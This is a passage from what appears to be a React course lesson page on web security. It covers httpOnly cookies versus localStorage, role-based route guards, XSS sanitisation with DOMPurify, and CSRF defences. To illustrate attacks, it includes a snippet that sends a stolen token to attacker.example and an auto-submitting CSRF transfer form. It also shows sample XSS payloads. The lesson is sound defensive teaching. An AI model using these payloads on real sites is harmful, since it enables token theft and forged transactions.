+              <code>dangerouslySetInnerHTML</code>, a compromised third-party npm package, an ad
+              script — an attacker's injected code can do <code>localStorage.getItem('token')</code>
+              and exfiltrate it to their own server in one line. No cookie theft, no network
+              interception required; the token was sitting in a place JavaScript was always allowed
+              to read.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">what an XSS payload can do if the token lives in localStorage</div>
+              <pre><code>// injected via any unsanitized render path -- see Section 4
+const stolen = localStorage.getItem('authToken');
+fetch('https://attacker.example/collect?t=' + stolen); // token is now theirs
+</code></pre>
+            </div>
+
+            <p>
+              An <code>httpOnly</code> cookie closes exactly this hole: it's marked so that
+              <strong>JavaScript cannot read it at all</strong> — not <code>document.cookie</code>,
+              not any library, nothing running on the page. The browser still attaches it to requests
+              automatically, so the server can still authenticate the user; client-side code simply
+              never touches the credential. The tradeoff is that a cookie-based session opens the
+              door to a different attack, CSRF, covered in Section 5 — httpOnly cookies aren't a free
+              upgrade, they trade one risk for a different, more containable one.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">server — login endpoint sets an httpOnly cookie, never returns a token in the body (Express)</div>
+              <pre><code>app.post('/api/login', async (req, res) =&gt; {
+  const { email, password } = req.body;
+  const user = await verifyCredentials(email, password);
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+  const token = signToken({ sub: user.id, role: user.role }); // JWT, but never sent to JS
+
+  res.cookie('authToken', token, {
+    httpOnly: true,               // invisible to document.cookie / any JS
+    secure: true,                 // only sent over HTTPS
+    sameSite: 'lax',              // mitigates CSRF -- see Section 5
+    maxAge: 60 * 60 * 1000,       // 1 hour
+  });
+
+  res.json({ user: { id: user.id, name: user.name } }); // no token here
+});
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">client — no token ever touches JS; the browser attaches the cookie automatically</div>
+              <pre><code>async function login(email: string, password: string) {
+  const res = await fetch('/api/login', {
+    method: 'POST',
+    credentials: 'include', // send/receive cookies on this cross-origin-capable request
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ email, password }),
+  });
+  return res.json(); // { user: { id, name } } -- that's all the client ever sees
+}
+
+// every later authenticated request just needs credentials: 'include' --
+// no Authorization header to manage, no token to remember to attach
+async function getProfile() {
+  const res = await fetch('/api/profile', { credentials: 'include' });
+  return res.json();
+}
+</code></pre>
+            </div>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>What about a plain in-memory variable?</strong>
+                <p>Keeping a token in a React state variable (not <code>localStorage</code>) is still readable by any injected script <em>while that script runs</em>, but at least doesn't persist it for an attacker to grab later or across tabs. It's a real improvement over <code>localStorage</code>, but an httpOnly cookie remains the stronger default whenever your frontend and API share a domain (or a configured cross-subdomain cookie) — it removes the token from JS's reach entirely, not just from persistent storage.</p>
+              </div>
+            </div>
+          </section>
+
+          <section id="protected-routes-rbac">
+            <h2>3. Protected Routes &amp; Role-Based Access Control</h2>
+            <p>
+              Week 7's <code>RequireAuth</code> answered one question — is anyone logged in? Most
+              real apps need a second, sharper question: is <em>this</em> logged-in user allowed to
+              see <em>this</em> page? An admin dashboard shouldn't render for a user whose role is
+              <code>"viewer"</code>, even though they're fully authenticated.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">RequireRole.tsx — extends Week 7's RequireAuth with a role check</div>
+              <pre><code>import { Navigate, Outlet, useLocation } from 'react-router';
+import { useAuth } from './useAuth';
+
+type Role = 'viewer' | 'editor' | 'admin';
+
+function RequireRole({ role }: { role: Role }) {
+  const { user } = useAuth();
+  const location = useLocation();
+
+  if (!user) {
+    // not logged in at all -- same redirect Week 7 used
+    return &lt;Navigate to="/login" state={{ from: location }} replace /&gt;;
+  }
+
+  if (user.role !== role) {
+    // logged in, but the wrong role -- a different destination than "please log in"
+    return &lt;Navigate to="/forbidden" replace /&gt;;
+  }
+
+  return &lt;Outlet /&gt;;
+}
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">route config -- wrapping only the admin subtree</div>
+              <pre><code>const router = createBrowserRouter([
+  { path: '/login', element: &lt;LoginPage /&gt; },
+  { path: '/forbidden', element: &lt;ForbiddenPage /&gt; },
+  {
+    element: &lt;RequireAuth /&gt;, // Week 7 -- must be logged in at all
+    children: [
+      { path: '/dashboard', element: &lt;DashboardPage /&gt; },
+      {
+        element: &lt;RequireRole role="admin" /&gt;, // additionally, must be an admin
+        children: [
+          { path: '/admin', element: &lt;AdminPage /&gt; },
+          { path: '/admin/users', element: &lt;AdminUsersPage /&gt; },
+        ],
+      },
+    ],
+  },
+]);
+</code></pre>
+            </div>
+
+            <p>
+              Stacking wrapper routes like this composes cleanly: <code>/admin</code> is nested
+              inside both <code>RequireAuth</code> and <code>RequireRole</code>, so an unauthenticated
+              visitor bounces to <code>/login</code> and an authenticated non-admin bounces to
+              <code>/forbidden</code> — two different, correct outcomes from one route tree.
+            </p>
+
+            <p>
+              The same check belongs in a <strong>loader</strong> (Week 7) too, not only a wrapper
+              component — useful when the redirect decision should happen before any of the route's
+              elements render at all, particularly for a route with its own data-fetching loader:
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">requireRole.ts -- a loader-level guard</div>
+              <pre><code>import { redirect } from 'react-router';
+import { getCurrentUser } from './auth';
+
+function requireRole(role: 'viewer' | 'editor' | 'admin') {
+  return async () =&gt; {
+    const user = await getCurrentUser(); // reads the session, e.g. via /api/me
+    if (!user) throw redirect('/login');
+    if (user.role !== role) throw redirect('/forbidden');
+    return user;
+  };
+}
+
+// route config
+{
+  path: '/admin/users',
+  element: &lt;AdminUsersPage /&gt;,
+  loader: requireRole('admin'),
+}
+</code></pre>
+            </div>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>Still not a security boundary</strong>
+                <p>Exactly like Week 7's warning: <code>RequireRole</code> and <code>requireRole</code> loaders control what renders in the browser, nothing more. The <code>/api/admin/users</code> endpoint itself must independently check the caller's role on the server, every request — a client-side check is convenience for legitimate users, not a wall against anyone willing to call the API directly.</p>
+              </div>
+            </div>
+          </section>
+
+          <section id="xss-prevention">
+            <h2>4. XSS Prevention &amp; Sanitizing User Content</h2>
+            <p>
+              Cross-site scripting (XSS) is an attacker getting their own JavaScript to run inside
+              your page, in your users' browsers, under your origin — which is exactly what makes
+              Section 2's <code>localStorage</code> token theft possible, and much worse besides.
+              React's default behavior already closes the most common door: when you render
+              <code>{'{someString}'}</code> in JSX, React escapes it as text, not HTML. A comment
+              containing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> renders as the literal
+              visible text of that string, not as an executed script tag.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">safe by default -- JSX escapes this automatically</div>
+              <pre><code>function Comment({ text }: { text: string }) {
+  return &lt;p&gt;{text}&lt;/p&gt;; // even if text is "&lt;img src=x onerror=alert(1)&gt;", it renders as inert text
+}
+</code></pre>
+            </div>
+
+            <p>
+              The risk reappears the moment you opt out of that default with
+              <code>dangerouslySetInnerHTML</code> — a prop that's honestly named: it hands React a
+              raw HTML string and tells it to inject that HTML directly into the DOM, script tags,
+              event handlers and all, with zero escaping. It exists because some content is
+              legitimately meant to be rendered <em>as</em> HTML — a rich-text editor's output, a
+              CMS field, a Markdown-to-HTML conversion — not because it's ever safe to point directly
+              at unvalidated user input.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">the unsafe version -- never do this with user-supplied content</div>
+              <pre><code>function Comment({ html }: { html: string }) {
+  // html came from another user's input. This executes anything they put in it.
+  return &lt;div dangerouslySetInnerHTML={{ __html: html }} /&gt;;
+}
+</code></pre>
+            </div>
+
+            <p>
+              The fix isn't to avoid rich HTML content — it's to <strong>sanitize</strong> it first,
+              stripping anything that isn't safe to render (script tags, <code>onerror</code>/<code>onclick</code>
+              handlers, <code>javascript:</code> URLs) while keeping legitimate formatting tags
+              (<code>&lt;b&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;p&gt;</code>) intact.
+              <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noreferrer">DOMPurify</a>
+              is the standard tool for this:
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">terminal</div>
+              <pre><code>npm install dompurify
+npm install -D @types/dompurify
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">SafeComment.tsx -- sanitize before rendering, every time</div>
+              <pre><code>import DOMPurify from 'dompurify';
+
+function SafeComment({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
+    ALLOWED_ATTR: ['href', 'target', 'rel'],
+  });
+
+  return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;
+}
+
+// &lt;SafeComment html="Nice work! &lt;script&gt;stealCookies()&lt;/script&gt;" /&gt;
+// renders: "Nice work! " -- the script tag is stripped entirely, nothing executes
+</code></pre>
+            </div>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>The actual rule</strong>
+                <p>If the content is a plain string, JSX already protects you — just render it normally. If it must be rendered as HTML, it must pass through a sanitizer immediately before <code>dangerouslySetInnerHTML</code>, with no exceptions for "trusted" sources — a compromised admin account or a hacked CMS is still user-supplied content from your app's perspective.</p>
+              </div>
+            </div>
+          </section>
+
+          <section id="csrf-secure-api">
+            <h2>5. CSRF &amp; Secure API Calls</h2>
+            <p>
+              Cross-site request forgery (CSRF) targets cookie-based auth specifically — it doesn't
+              touch JWT-in-an-<code>Authorization</code>-header setups at all, because that pattern
+              requires JavaScript on your own origin to attach the token, and a malicious site can't
+              read or set headers on requests to your API. A cookie, on the other hand, is
+              attached by the browser <strong>automatically</strong>, to requests from any site —
+              which is exactly the mechanism CSRF abuses.
+            </p>
+
+            <p>
+              The attack: a user is logged into <code>bank.example</code> (session cookie set). They
+              then visit <code>evil.example</code>, which contains a hidden form auto-submitting a
+              POST to <code>bank.example/api/transfer</code>. The browser dutifully attaches the
+              <code>bank.example</code> session cookie to that request — because it doesn't know or
+              care which site's HTML triggered it — and the transfer executes as if the real user
+              requested it, because as far as the server can tell, they did.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">the attack -- hosted on a completely different site</div>
+              <pre><code>&lt;!-- evil.example --&gt;
+&lt;form action="https://bank.example/api/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="attacker-account" /&gt;
+  &lt;input type="hidden" name="amount" value="5000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
+&lt;!-- the browser attaches bank.example's session cookie automatically -- no consent needed --&gt;
+</code></pre>
+            </div>
+
+            <p>
+              The <strong><code>SameSite</code></strong> cookie attribute is the first line of
+              defense, and it's the one already set in Section 2's login example.
+              <code>SameSite=Strict</code> tells the browser to never send that cookie on a
+              cross-site request, period — the evil.example form above would submit with no
+              session cookie attached at all, and the server would see an unauthenticated request.
+              <code>SameSite=Lax</code> (the modern browser default) is slightly more permissive —
+              it still sends the cookie for top-level navigations (clicking a real link) but blocks
+              it on cross-site POSTs like the form above, which covers the CSRF case while not
+              breaking normal cross-site linking.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">the strongest setting, when your frontend and API share a site</div>
+              <pre><code>res.cookie('authToken', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict', // never sent on any cross-site request, forged or not
+});
+</code></pre>
+            </div>
+
+            <p>
+              For extra defense-in-depth (or when <code>SameSite=Strict</code> is too restrictive
+              for a legitimate flow), the <strong>double-submit CSRF token</strong> pattern adds a
+              second, independent check: the server sends a random token the page can read, the
+              client echoes it back in a custom header on every mutation, and the server confirms the
+              header matches — something a cross-site form, which can't read your page's JavaScript
+              or cookies, has no way to forge.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">client -- read the CSRF token from a non-httpOnly cookie, echo it back on mutations</div>
+              <pre><code>function getCsrfToken(): string | undefined {
+  return document.cookie
+    .split('; ')
+    .find(row =&gt; row.startsWith('csrf_token='))
+    ?.split('=')[1];
+}
+
+async function transferFunds(to: string, amount: number) {
+  return fetch('/api/transfer', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-CSRF-Token': getCsrfToken() ?? '', // a forged cross-site request can't set this
+    },
+    body: JSON.stringify({ to, amount }),
+  });
+}
+</code></pre>
+            </div>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>Why the CSRF token cookie isn't httpOnly</strong>
+                <p>The double-submit pattern relies on your own page's JavaScript being able to read the token and echo it in a header — that's the entire proof that the request originated from your site, since a cross-origin attacker's script can't read cookies set for your domain. The <em>auth</em> cookie stays httpOnly; the CSRF token cookie is a separate, deliberately-readable value with no sensitive data in it.</p>
+              </div>
+            </div>
+          </section>
+
+          <section id="exercise">
+            <h2>6. Hands-on Exercise</h2>
+            <div class="lesson-exercise">
+              <span class="lesson-exercise__badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h7l-1 8 11-14h-7l1-6Z"/></svg>
+                Hands-on
+              </span>
+              <h3>Build a real RequireAuth/RequireRole pair, an httpOnly login flow, and a sanitized comment</h3>
+              <p>Turn this week's security concerns into working code inside one small app — including the two Part 1 doesn't reach: a real OAuth redirect flow and CSRF protection on a state-changing request.</p>
+
+              <p><strong>Part 1 — Auth, roles, and sanitization:</strong></p>
+              <ol>
+                <li>Write a <code>RequireAuth</code> route wrapper (as in Week 7) plus a <code>RequireRole({'role'})</code> wrapper that accepts a role and redirects to <code>/forbidden</code> when the current user's role doesn't match — wire both into a route tree so <code>/admin</code> requires <em>both</em> being logged in and being an admin.</li>
+                <li>Write a <code>login()</code> function that POSTs credentials to <code>/api/login</code> with <code>credentials: 'include'</code> and never reads or stores a token in JS. If you don't have a real backend available, write the Express-style handler from Section 2 in a comment above your client code to show exactly what it would set.</li>
+                <li>Add a fake current-user hook (<code>useAuth</code>) backed by an <code>/api/me</code> call that relies purely on the cookie being attached automatically — no token passed manually anywhere in your client code.</li>
+                <li>Install DOMPurify and render one piece of "user-generated" rich-text content (hardcode a string containing a <code>&lt;script&gt;</code> tag to prove it gets stripped) through a sanitized <code>dangerouslySetInnerHTML</code>, using an allowlist of tags.</li>
+                <li>Add a comment documenting which <code>SameSite</code> value your login cookie uses and why you chose it over the alternative.</li>
+              </ol>
+
+              <div class="callout callout--tip">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+                <div>
+                  <strong>Hint</strong>
+                  <p>To confirm your token really isn't reachable from JS, open your browser's dev console on the running app and try <code>document.cookie</code> — an httpOnly cookie simply won't appear in that string, which is the whole point.</p>
+                </div>
+              </div>
+
+              <p><strong>Part 2 — OAuth redirect flow and CSRF protection:</strong></p>
+              <ol>
+                <li>Add a "Sign in with Google" button that redirects the browser to a (simulated) provider authorization URL, including a randomly-generated <code>state</code> parameter stored in <code>sessionStorage</code> before the redirect.</li>
+                <li>Write the callback route (<code>/auth/callback</code>) that reads the <code>code</code> and <code>state</code> query params, verifies <code>state</code> matches what was stored before redirecting (rejecting the login if it doesn't — this is the CSRF protection built into the OAuth flow itself), and simulates exchanging <code>code</code> for a session by calling your existing <code>/api/login</code>-style endpoint.</li>
+                <li>Add a CSRF token to one real state-changing request elsewhere in the app (e.g. the "Add Product" form from Week 20, or a comment-post action) following Section 5's double-submit-cookie or synchronizer-token pattern — read the token from a cookie or a hidden form field, and send it back in a header on the mutating request.</li>
+                <li>Prove the protection works: temporarily strip the CSRF token from the request and confirm your (simulated or real) backend handler rejects it; put the token back and confirm the request succeeds again.</li>
+              </ol>
+
+              <div class="callout callout--tip">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+                <div>
+                  <strong>Hint</strong>
+                  <p>The <code>state</code> parameter check in Part 2's callback route and the CSRF token check in Part 2's mutation are solving the same underlying problem two different ways — confirming a request genuinely originated from your own app's flow, not a malicious page tricking the browser into replaying a cookie-authenticated request. Noticing that similarity is worth more than memorizing either mechanism in isolation.</p>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <section id="quiz">
+            <h2>7. Knowledge Check</h2>
+            <p>Four quick questions. Expand each to check your answer.</p>
+
+            <div class="quiz-list">
+              <details class="week-item quiz-item">
+                <summary>
+                  <span class="week-item__badge">Q1</span>
+                  <div class="week-item__heading">
+                    <h4>What's the core tradeoff between a server session (cookie + server-side store) and a JWT?</h4>
+                  </div>
+                  <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
+                </summary>
+                <div class="week-item__body week-item__body--single">
+                  <div class="week-item__col">
+                    <p>A server session keeps state on the server, which makes revocation instant (delete the session row) but requires that state to be reachable by every server instance handling requests. A JWT is self-contained and stateless — any server holding the signing secret can verify it without a lookup, which scales easily, but there's no way to revoke a single token before it expires without adding extra machinery like a denylist.</p>
+                  </div>
+                </div>
+              </details>
+
+              <details class="week-item quiz-item">
+                <summary>
+                  <span class="week-item__badge">Q2</span>
+                  <div class="week-item__heading">
+                    <h4>Why is storing an auth token in <code>localStorage</code> usually the wrong choice?</h4>
+                  </div>
+                  <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
+                </summary>
+                <div class="week-item__body week-item__body--single">
+                  <div class="week-item__col">
+                    <p><code>localStorage</code> is fully readable by any JavaScript running on the page. If the app has even one XSS vulnerability — one unsanitized render, one compromised dependency — an attacker's injected script can read the token directly with <code>localStorage.getItem(...)</code> and send it to their own server, no cookie theft or network interception required. An httpOnly cookie removes this risk because JavaScript can't read it at all.</p>
+                  </div>
+                </div>
+              </details>
+
+              <details class="week-item quiz-item">
+                <summary>
+                  <span class="week-item__badge">Q3</span>
+                  <div class="week-item__heading">
+                    <h4>When is <code>dangerouslySetInnerHTML</code> actually necessary, and how do you use it safely?</h4>
+                  </div>
+                  <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
+                </summary>
+                <div class="week-item__body week-item__body--single">
+                  <div class="week-item__col">
+                    <p>It's needed when content is legitimately meant to render as HTML rather than plain text — rich-text editor output, a CMS field, converted Markdown — cases where JSX's default text-escaping would be wrong, not just inconvenient. It's safe only when the HTML string is passed through a sanitizer like DOMPurify (with an explicit tag/attribute allowlist) immediately before rendering, every time, regardless of how "trusted" the source seems.</p>
+                  </div>
+                </div>
+              </details>
+
+              <details class="week-item quiz-item">
+                <summary>
+                  <span class="week-item__badge">Q4</span>
+                  <div class="week-item__heading">
+                    <h4>How does a <code>SameSite=Strict</code> cookie mitigate CSRF?</h4>
+                  </div>
+                  <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
+                </summary>
+                <div class="week-item__body week-item__body--single">
+                  <div class="week-item__col">
+                    <p>CSRF relies on the browser automatically attaching a session cookie to a request triggered by a form or script hosted on a completely different, malicious site. <code>SameSite=Strict</code> tells the browser to never send that cookie on any cross-site request, so the forged request arrives at the server with no session cookie attached at all — indistinguishable from an unauthenticated request, and rejected accordingly.</p>
+                  </div>
+                </div>
+              </details>
+            </div>
+          </section>
+
+        </article>
+
+        <div class="lesson-pager">
+          <a href="week-24.html" class="lesson-pager__link lesson-pager__link--prev">
+            <span class="lesson-pager__label">← Back to</span>
+            <span class="lesson-pager__title">Week 24: Animations &amp; Internationalization</span>
+          </a>
+          <a href="week-26.html" class="lesson-pager__link lesson-pager__link--next">
+            <span class="lesson-pager__label">Up next</span>
+            <span class="lesson-pager__title">Week 26: Micro-Frontends &amp; Advanced Architecture →</span>
+          </a>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <div class="footer__top">
+      <div class="footer__brand">
+        <a href="../../index.html" class="brand">
+          <svg class="brand__mark" viewBox="0 0 100 100" aria-hidden="true" focusable="false"><rect width="100" height="100" rx="22" fill="url(#brandGrad)"/><path d="M 46 28 L 22 50 L 46 72" fill="none" stroke="#fff" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/><path d="M 54 28 L 78 50 L 54 72" fill="none" stroke="#fff" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/><circle cx="50" cy="50" r="6.5" fill="#fff"/></svg>
+          CodeVerse Creatives
+        </a>
+        <p class="footer__tagline">Free, project-based curricula for developers who'd rather ship than scroll — from first commit to deployed capstone.</p>
+      </div>
+
+      <div class="footer__group">
+        <span class="footer__heading">Courses</span>
+        <div class="footer__course-grid">
+          <a href="../../courses/angular/index.html">Angular</a>
+          <a href="../../courses/cybersecurity/index.html">Cybersecurity Basics</a>
+          <a href="../../courses/devops-cloud/index.html">DevOps &amp; Cloud</a>
+          <a href="../../courses/dsa-cpp/index.html">DSA in C++</a>
+          <a href="../../courses/github/index.html">Git &amp; GitHub</a>
+      <a href="../../courses/javascript-typescript/index.html">JavaScript &amp; TypeScript</a>
+          <a href="../../courses/llm-ml/index.html">AI &amp; ML</a>
+          <a href="../../courses/artificial-intelligence/index.html">Artificial Intelligence</a>
+          <a href="../../courses/machine-learning/index.html">Machine Learning</a>
+          <a href="../../courses/data-science/index.html">Data Science</a>
+          <a href="../../courses/node-express/index.html">Node.js &amp; Express</a>
+          <a href="../../courses/aptitude/index.html">Numerical Aptitude</a>
+          <a href="../../courses/php/index.html">PHP</a>
+          <a href="../../courses/python/index.html">Python</a>
+          <a href="../../courses/react/index.html">React</a>
+          <a href="../../courses/react-native/index.html">React Native</a>
+          <a href="../../courses/servicenow/index.html">ServiceNow</a>
+          <a href="../../courses/spring-boot/index.html">Spring Boot</a>
+          <a href="../../courses/system-design/index.html">System Design</a>
+          <a href="../../courses/mongodb/index.html">MongoDB</a>
+          <a href="../../courses/data-analytics/index.html">Excel, SQL &amp; Power BI</a>
+          <a href="../../courses/golang/index.html">Go</a>
+          <a href="../../courses/flutter/index.html">Flutter</a>
+          <a href="../../courses/coding-practice/index.html">Coding Practice</a>
+          <a href="../../courses/docker-kubernetes/index.html">Docker &amp; Kubernetes</a>
+                  <a href="../../courses/sql-postgresql/index.html">SQL &amp; PostgreSQL</a>
+          <a href="../../courses/claude/index.html">Claude</a>
+          <a href="../../courses/ugc-net-cse/index.html">UGC NET Computer Science</a>
+          <a href="../../courses/kannada/index.html">Kannada Language</a>
+          <a href="../../courses/distributed-systems/index.html">Distributed Systems</a>
+          <a href="../../courses/oracle-netsuite/index.html">Oracle NetSuite</a>
+        </div>
+      </div>
+
+      <div class="footer__group">
+        <span class="footer__heading">Explore</span>
+        <nav class="footer__nav">
+          <a href="../../index.html">Home</a>
+          <a href="#" data-back-to-top>↑ Back to top</a>
+        </nav>
+      </div>
+    </div>
+
+    <div class="footer__bottom">
+      <small>© 2026 CodeVerse Creatives. All rights reserved.</small>
+    </div>
+  </div>
+</footer>
+
+<script src="../../js/main.js"></script>
+</body>
+</html>
